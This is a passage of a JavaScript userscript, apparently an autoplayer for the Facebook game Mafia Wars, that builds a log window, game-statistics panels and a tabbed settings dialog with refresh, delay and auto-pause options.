    passiveBtnElt.style.color = 'rgb(0, 128, 0)';
    primaryBtnElt.style.color = 'rgb(0, 255, 0)';
  }
}

function showPassiveStats() {
  var passiveElt = document.getElementById('statPassive');
  var primaryElt = document.getElementById('statPrimary');
  var primaryBtnElt = document.getElementById('btnPrimaryStat');
  var passiveBtnElt = document.getElementById('btnPassiveStat');
  if (passiveElt && primaryElt) {
    primaryElt.style.display = 'none';
    passiveElt.style.display = 'block';
    primaryBtnElt.style.color = 'rgb(0, 128, 0)';
    passiveBtnElt.style.color = 'rgb(0, 255, 0)';
  }
}

function createLogBox() {
  var title;

  var mafiaLogBox = makeElement('div', document.body, {'id':'mafiaLogBox', 'style':'position: fixed; right: 10px; top: 10px; bottom: 10px; width: 450px; background: black url(http://mwdirectfb3.static.zynga.com/mwfb/graphics/MW_FB_Background_760.gif); text-align: left; padding: 5px; border: 1px solid; border-color: #FFFFFF; z-index: 98; font-size: 12px;'});

  var logClrButton = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'style':'position: absolute; left: 5px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    logClrButton.appendChild(document.createTextNode('clear log'));
    logClrButton.addEventListener('click', clearLog, false);

  var logClrStatsButton = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'style':'position: absolute; left: 85px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    logClrStatsButton.appendChild(document.createTextNode('clear stats'));
    logClrStatsButton.addEventListener('click', clearStats, false);

  var closeLogButton = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'style':'position: absolute; right: 5px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    closeLogButton.appendChild(document.createTextNode('close'));
    closeLogButton.addEventListener('click', hideMafiaLogBox, false);

  title = 'Click to toggle log filtering';
  var filterElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_filter_log', 'style':'display:'+(debug ? 'none' : 'block')+'; position: absolute; right: 170px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(' + (filter ? '255' : '100') + ', 0, 0);'});
    filterElt.appendChild(document.createTextNode('filter'));
    filterElt.addEventListener('click', logFilterOnOff, false);

  title = 'Click to toggle debug log';
  var debugElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_debug_log', 'style':'position: absolute; right: 120px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(' + (debug ? '255' : '100') + ', 0, 0);'});
    debugElt.appendChild(document.createTextNode('debug'));
    debugElt.addEventListener('click', debugOnOff, false);

  title = 'Click to ' + (running ? 'pause' : 'resume') + ' PS MWAP';
  var mwapElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_mwap_pause', 'style':'position: absolute; right: 60px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    mwapElt.appendChild(document.createTextNode(running ? 'pause' : 'resume'));
    mwapElt.addEventListener('click', mwapOnOff, false);

  var logBox = makeElement('div', mafiaLogBox, {'id':'logBox', 'style':'position: absolute; overflow: auto; right: 0px; top: 20px; bottom: 75px; width: 448px; background-color: #111111; font-size:11px; color: #BCD2EA; text-align: left; padding: 5px; border: 1px solid;'});
    logBox.innerHTML = GM_getValue('itemLog', '');

  // stat tabs....
  var statPrimaryElt = makeElement('div', mafiaLogBox, {'id': 'statPrimary', 'style':'display: block' });
  var statPassiveElt = makeElement('div', mafiaLogBox, {'id': 'statPassive', 'style':'display: none' });

  // tab buttons
  var statPrimaryButton = makeElement('div', mafiaLogBox, {'id': 'btnPrimaryStat', 'class':'mouseunderline', 'style':'position: absolute; left: 5px; bottom: 63px; font-weight: 600; cursor: pointer; color: rgb(0, 255, 0);'});
  statPrimaryButton.appendChild(document.createTextNode('primary'));
  statPrimaryButton.addEventListener('click', showPrimaryStats, false);

  var statPassiveButton = makeElement('div', mafiaLogBox, {'id': 'btnPassiveStat', 'class':'mouseunderline', 'style':'position: absolute; left: 85px; bottom: 63px; font-weight: 600; cursor: pointer; color: rgb(0, 128, 0);'});
  statPassiveButton.appendChild(document.createTextNode('passive'));
  statPassiveButton.addEventListener('click', showPassiveStats, false);

  makeElement('div', statPassiveElt, {'style':'position: absolute;  left: 5px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Exp Gained:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalExp', 'style':'position: absolute; right: 305px; bottom: 50px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalFightExpInt', 0) + GM_getValue('passivetotalJobExpInt', 0))));
  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 267px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fights:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalFightExp', 'style':'position: absolute; right: 205px; bottom: 50px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalFightExpInt', 0))));
  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 175px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Jobs:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalJobExp', 'style':'position: absolute; right: 115px; bottom: 50px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalJobExpInt', 0))));

  makeElement('hr', statPassiveElt, {'style':'position: absolute; left: 0; bottom: 42px; height: 1px; border: 0px; width: 90%; margin-left: 5%; color: #666666; background-color: #666666'});

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 5px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Attacks:'));
  makeElement('div', statPassiveElt, {'id':'passivefightCount', 'style':'position: absolute; right: 360px; bottom: 33px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0))));

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 5px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Won:'));
  makeElement('div', statPassiveElt, {'id':'passivefightWinCount', 'style':'position: absolute; right: 360px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightWinCountInt', 0))));
  var passivefightWinPct = (GM_getValue('passivefightWinCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPassiveElt, {'id':'passivefightWinPct', 'style':'position: absolute; right: 325px; bottom: 18px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(passivefightWinPct)) ? '0.0%' : passivefightWinPct + '%'));
  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 5px; bottom: 3px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Lost:'));
  makeElement('div', statPassiveElt, {'id':'passivefightLossCount', 'style':'position: absolute; right: 360px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightLossCountInt', 0))));
  var passivefightLossPct = (GM_getValue('passivefightLossCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPassiveElt, {'id':'passivefightLossPct', 'style':'position: absolute; right: 325px; bottom: 3px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(passivefightLossPct)) ? '0.0%' : passivefightLossPct + '%'));

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 140px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('HitListed:'));
  makeElement('div', statPassiveElt, {'id':'whackedCount', 'style':'position: absolute; right: 250px; bottom: 33px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(GM_getValue('whackedCount', 0)));
  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 140px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Snuffed:'));
  makeElement('div', statPassiveElt, {'id':'snuffCount', 'style':'position: absolute; right: 250px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(GM_getValue('snuffCount', 0)));

  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 5px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Total $ Won/Lost'));
  var winDollars = parseInt(GM_getValue('passivefightWin$NY', 0)) + parseInt(GM_getValue('passivefightWin$Cuba', 0)) + parseInt(GM_getValue('passivefightWin$Moscow', 0)) + parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + parseInt(GM_getValue('passivefightWin$Vegas', 0));
  var lossDollars = parseInt(GM_getValue('passivefightLoss$NY', 0)) + parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + parseInt(GM_getValue('passivefightLoss$Vegas', 0));
  var titlePassiveWinDollars = '$' + makeCommaValue(GM_getValue('passivefightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightWin$Vegas', 0));
  var titlePassiveLossDollars = '$' + makeCommaValue(GM_getValue('passivefightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightLoss$Vegas', 0));
  makeElement('div', statPassiveElt, {'id':'totalPassiveWinDollars', 'title':titlePassiveWinDollars, 'style':'position: absolute; right: 5px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode( getDollarsUnit(winDollars) ));  //Accomodates up to $999,999,999,999
  makeElement('div', statPassiveElt, {'id':'totalPassiveLossDollars', 'title':titlePassiveLossDollars, 'style':'position: absolute; right: 5px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode( getDollarsUnit(lossDollars) ));

  //Change Stats Displayed based on current stamina burner
  //fight Stats are currently default for leftmost portion of Stats
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 5px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fights:'));
  makeElement('div', statPrimaryElt, {'id':'fightCount', 'style':'position: absolute; right: 360px; bottom: 33px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 5px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Won:'));
  makeElement('div', statPrimaryElt, {'id':'fightWinCount', 'style':'position: absolute; right: 360px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightWinCountInt', 0))));
  var fightWinPct = (GM_getValue('fightWinCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'fightWinPct', 'style':'position: absolute; right: 325px; bottom: 18px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 5px; bottom: 3px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Lost:'));
  makeElement('div', statPrimaryElt, {'id':'fightLossCount', 'style':'position: absolute; right: 360px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightLossCountInt', 0))));
  var fightLossPct = (GM_getValue('fightLossCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'fightLossPct', 'style':'position: absolute; right: 325px; bottom: 3px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 140px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Hits:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanCount', 'style':'position: absolute; right: 250px; bottom: 33px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue((GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 140px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Succ:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanWinCount', 'style':'position: absolute; right: 250px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('hitmanWinCountInt', 0))));
  var hitmanWinPct = (GM_getValue('hitmanWinCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'hitmanWinPct', 'style':'position: absolute; right: 215px; bottom: 18px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(hitmanWinPct)) ? '0.0%' : hitmanWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 140px; bottom: 3px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fail:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanLossCount', 'style':'position: absolute; right: 250px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('hitmanLossCountInt', 0))));
  var hitmanLossPct = (GM_getValue('hitmanLossCountInt', 0)/(GM_getValue('hitmanWinCountInt', 1) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'hitmanLossPct', 'style':'position: absolute; right: 215px; bottom: 3px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(hitmanLossPct)) ? '0.0%' : hitmanLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 250px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Robs:'));
  makeElement('div', statPrimaryElt, {'id':'robCount', 'style':'position: absolute; right: 135px; bottom: 33px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue((GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 250px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Succ:'));
  makeElement('div', statPrimaryElt, {'id':'robWinCount', 'style':'position: absolute; right: 135px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('robSuccessCountInt', 0))));
  var robWinPct = (GM_getValue('robSuccessCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'robWinPct', 'style':'position: absolute; right: 100px; bottom: 18px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(robWinPct)) ? '0.0%' : robWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 250px; bottom: 3px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fail:'));
  makeElement('div', statPrimaryElt, {'id':'robLossCount', 'style':'position: absolute; right: 135px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('robFailedCountInt', 0))));
  var robLossPct = (GM_getValue('robFailedCountInt', 0)/(GM_getValue('robSuccessCountInt', 1) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'robLossPct', 'style':'position: absolute; right: 100px; bottom: 3px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(robLossPct)) ? '0.0%' : robLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 5px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Total $ Won/Lost'));
  var titleWinDollars = '$' + makeCommaValue(GM_getValue('fightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightWin$Vegas', 0));
  var titleLossDollars = '$' + makeCommaValue(GM_getValue('fightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightLoss$Vegas', 0));
  makeElement('div', statPrimaryElt, {'id':'totalWinDollars', 'title':titleWinDollars, 'style':'position: absolute; right: 5px; bottom: 18px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode( getDollarsUnit(parseInt(GM_getValue('totalWinDollarsInt', 0))) ));  //Accomodates up to $999,999,999,999
  makeElement('div', statPrimaryElt, {'id':'totalLossDollars', 'title':titleLossDollars, 'style':'position: absolute; right: 5px; bottom: 3px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode( getDollarsUnit(parseInt(GM_getValue('totalLossDollarsInt', 0))) ));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 5px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Exp Gained:'));
  makeElement('div', statPrimaryElt, {'id':'totalExp', 'style':'position: absolute; right: 329px; bottom: 50px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('totalExpInt', 0))));
  makeElement('hr', statPrimaryElt, {'style':'position: absolute; left: 0; bottom: 42px; height: 1px; border: 0px; width: 90%; margin-left: 5%; color: #666666; background-color: #666666'});

  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 267px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Gain Rate:'));
  var rate = getStaminaGainRate();
  makeElement('div', statPrimaryElt, {'id':'expRate', 'style':'position: absolute; right: 240px; bottom: 50px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(rate.toFixed(2)));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 175px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Nxt Lvl In:'));
  makeElement('div', statPrimaryElt, {'id':'expToNext', 'style':'position: absolute; right: 141px; bottom: 50px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(makeCommaValue(ptsToNextLevel)));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 36px; bottom: 50px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Stam Req\'d to Lvl:'));
  makeElement('div', statPrimaryElt, {'id':'stamToNext', 'style':'position: absolute; right: 2px; bottom: 50px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(rate? (ptsToNextLevel / rate).toFixed(0) : 'n/a'));
}

function getDollarsUnit(amount) {
  var units = ['', 'K', 'M', 'G', 'T'];
  var dollarUnit = 0;
  while (amount > 1000) {
    amount /= 1000;
    dollarUnit++;
  }
  return units[dollarUnit] + '$' + amount.toFixed(3);
}

function createSettingsBox() {
  if (document.getElementById('settingsBox')) return;

  // This creates the settings box just like a facebook popup
  var elt = makeElement('div', document.body, {'class':'generic_dialog pop_dialog', 'id':'GenDialogPopDialog'});
  elt = makeElement('div', elt, {'class':'generic_dialog_popup', 'style':'top: 30px; width: 540px;'});
  elt = makeElement('div', elt, {'class':'pop_content popcontent_advanced', 'id':'pop_content'});
  var settingsBox = makeElement('div', elt, {'style':'border: 2px; position: fixed; right: 5px; top:  5px; width: 600px; height: 540px; font-size: 13px; z-index: 10001; padding: 5px; border: 1px solid #A0A0A0; color: #BCD2EA; background: black', 'id':'settingsBox'});
  //End settings box

  makeElement('img', settingsBox, {'src':stripURI(closeButtonIcon), 'style':'position: absolute; top: 3px; right: 3px; cursor: pointer;'}).addEventListener('click', toggleSettings, false);

  // NOTE: Use the 1st line below to center the button bar, or the 2nd line
  //       to put the bar on the left side.
  elt = makeElement('div', settingsBox, {'style':'position: static; margin-left: auto; margin-right: auto; width: 100%; text-align: center'});
  //elt = makeElement('div', settingsBox, {'style':'position: static; width: 100%; text-align: left'});

  var tabNav = makeElement('div', elt, {'id':'tabNav', 'style':'position: static; display: inline-block; background: transparent repeat-x scroll 0 0; border: 1px solid #AAAAAA; fontsize: 13px; line-height: 28px; '});
    var generalTabLink = makeElement('div', tabNav, {'class':'selected', 'id':'General_Tab'});
      makeElement('a', generalTabLink, {'href':'#', 'rel':'generalTab'}).appendChild(document.createTextNode('General'));
    var displayTabLink = makeElement('div', tabNav, {'id':'Display_Tab'});
      makeElement('a', displayTabLink, {'href':'#', 'rel':'displayTab'}).appendChild(document.createTextNode('Display'));
    var mafiaTabLink = makeElement('div', tabNav, {'id':'Mafia_Tab'});
      makeElement('a', mafiaTabLink, {'href':'#', 'rel':'mafiaTab'}).appendChild(document.createTextNode('Mafia'));
    var autostatTabLink = makeElement('div', tabNav, {'id':'Autostat_Tab'});
      makeElement('a', autostatTabLink, {'href':'#', 'rel':'autostatTab'}).appendChild(document.createTextNode('Autostat'));
    var energyTabLink = makeElement('div', tabNav, {'id':'Energy_Tab'});
      makeElement('a', energyTabLink, {'href':'#', 'rel':'energyTab'}).appendChild(document.createTextNode('Energy'));
    var staminaTabLink = makeElement('div', tabNav, {'id':'Stamina_Tab'});
      makeElement('a', staminaTabLink, {'href':'#', 'rel':'staminaTab'}).appendChild(document.createTextNode('Stamina'));
    var healTabLink = makeElement('div', tabNav, {'id':'Heal_Tab'});
      makeElement('a', healTabLink, {'href':'#', 'rel':'healTab'}).appendChild(document.createTextNode('Health'));
    var cashTabLink = makeElement('div', tabNav, {'id':'Cash_Tab'});
      makeElement('a', cashTabLink, {'href':'#', 'rel':'cashTab'}).appendChild(document.createTextNode('Cash'));
    var aboutTabLink = makeElement('div', tabNav, {'id':'About_Tab'});
      makeElement('a', aboutTabLink, {'href':'#', 'rel':'aboutTab'}).appendChild(document.createTextNode('About'));

  // Create General tab.
  var generalTab = createGeneralTab();
  settingsBox.appendChild(generalTab);

  // Create Display tab.
  var displayTab = createDisplayTab();
  settingsBox.appendChild(displayTab);

  // Create Mafia tab.
  var mafiaTab = createMafiaTab();
  settingsBox.appendChild(mafiaTab);

  // Create Autostat tab.
  var autostatTab = createAutostatTab();
  settingsBox.appendChild(autostatTab);

  // Create energy tab.
  var energyTab = createEnergyTab();
  settingsBox.appendChild(energyTab);

  // Create stamina tab.
  var staminaTab = createStaminaTab();
  settingsBox.appendChild(staminaTab);

  // Create health tab.
  var healTab = createHealTab();
  settingsBox.appendChild(healTab);

  // Create cash tab.
  var cashTab = createCashTab();
  settingsBox.appendChild(cashTab);

  // Create about tab.
  var aboutTab = createAboutTab();
  settingsBox.appendChild(aboutTab);

  // Create save button
  var saveButton = makeElement('span', settingsBox, {'class':'sexy_button', 'style':'left: 10px; bottom: 10px;'});
  makeElement('button', saveButton).appendChild(document.createTextNode('Save Settings'));
  saveButton.addEventListener('click', saveSettings, false);

  // Create Update button
  if (gvar.isGreaseMonkey) {
    var updateButton = makeElement('span', settingsBox, {'class':'sexy_button', 'style':'right: 10px; bottom: 10px;'});
    makeElement('button', updateButton).appendChild(document.createTextNode('Update-Check'));
    updateButton.addEventListener('click', updateScript, false);
  }

  createDynamicDrive();
}

// Create Dynamic Drive Script
function createDynamicDrive() {
  var ddriveElt = document.getElementById('ddriveCode');
  if (ddriveElt) ddriveElt.parentNode.removeChild(ddriveElt);

  // Tab code from: http://www.dynamicdrive.com/dynamicindex17/tabcontent.htm converted into a data URI
  makeElement('script', document.getElementsByTagName('head')[0], {'id':'ddriveCode','type':'text/javascript'})
    .appendChild(document.createTextNode(decode64(tabURI) + '\n' +
    ' /***********************************************\n' +
    ' /*** Tab Content script v2.2- Dynamic Drive DHTML code library (www.dynamicdrive.com)\n' +
    ' /*** This notice MUST stay intact for legal use\n' +
    ' /*** Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code\n' +
    ' ***********************************************/\n' +
    ' var tabs=new ddtabcontent("tabNav"); //enter ID of Tab Container\n' +
    ' tabs.setpersist(true); //toogle persistence of the tabs\' state\n' +
    ' tabs.setselectedClassTarget("linkparent"); //"link" or "linkparent"\n' +
    ' tabs.init();'
  ));
}

// Create General Tab
function createGeneralTab() {
  var elt, title, id, label, item, i, lhs, rhs, choice;
  var generalTab = makeElement('div', null, {'id':'generalTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', generalTab, {'style':'position: relative; top: 10px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // Refresh option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to refresh PS MWAP between the indicated time interval.';
  id = 'autoClick';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('img', lhs, {'style':'padding-left: 5px;','src':stripURI(energyIcon)});
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Refresh every:'));

  makeElement('input', rhs, {'type':'text','value':GM_getValue('r1', '30'), 'id':'r1', 'size':'1', 'style':'text-align: center'});
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' to '));
  makeElement('input', rhs, {'type':'text','value':GM_getValue('r2', '110'), 'id':'r2', 'size':'1', 'style':'text-align: center'});
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' seconds '));

  // Delay option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Set the delay interval between actions.';
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Delay between actions:'));

  makeElement('input', rhs, {'type':'text', 'value':GM_getValue('d1', '3'), 'id':'d1', 'size':'1', 'style':'text-align: center'});
  rhs.appendChild(document.createTextNode(' to '));
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue('d2', '5'), 'id':'d2', 'size':'1', 'style':'text-align: center'});
  rhs.appendChild(document.createTextNode(' seconds'));

  // Auto-pause
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to enable auto-pause before or after level up.';
  id = 'autoPause';
  var autoPause = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Enable auto-pause:'));
  autoPause.addEventListener('click', clickAutoPause, false);

  id = 'autoPauseBefore';
  title = ' Before level up ';
  makeElement('input', rhs, {'type':'radio', 'name':'r3', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  id = 'autoPauseAfter';
  title = ' After level up ';
  makeElement('input', rhs, {'type':'radio', 'name':'r3', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoPauseExp';
  lhs.appendChild(document.createTextNode('Experience left to pause at:'));
  makeElement('input', rhs, {'style':'text-align: right;','type':'text', 'value':GM_getValue(id, '50'), 'id':id, 'size':'2'});

  // Idle-in location
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to idle in preferred city';
  id = 'idleInCity';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' When idle, fly to:'));
  var idleLocation = makeElement('select', rhs, {'id':'idleLocation'});
  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(cities[i][CITY_NAME]));
    idleLocation.appendChild(choice);
  }
  idleLocation.selectedIndex = GM_getValue('idleLocation', NY);

